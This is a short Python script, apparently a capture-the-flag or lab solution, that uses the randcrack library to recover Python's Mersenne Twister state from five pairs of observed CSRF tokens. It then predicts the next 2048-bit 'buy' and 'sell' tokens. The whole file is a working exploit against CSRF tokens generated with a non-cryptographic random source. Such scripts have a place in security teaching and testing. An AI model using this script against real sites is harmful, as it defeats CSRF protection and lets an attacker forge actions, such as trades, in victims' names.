import random, time
from randcrack import RandCrack

rc = RandCrack()

print("enter 5 pairs of csrf tokens:")
for i in range(5):
	i += 1
	for num in (int(input(f"{i} buy: ")), int(input(f"{i} sell: "))):
		for j in range(64):
			try:
				rc.submit(num & 0xFFFFFFFF)
			except ValueError:
				rc.predict_getrandbits(32)
			num >>= 32
print("\nnext buy token:", rc.predict_getrandbits(2048))
print("\nnext sell token:", rc.predict_getrandbits(2048))
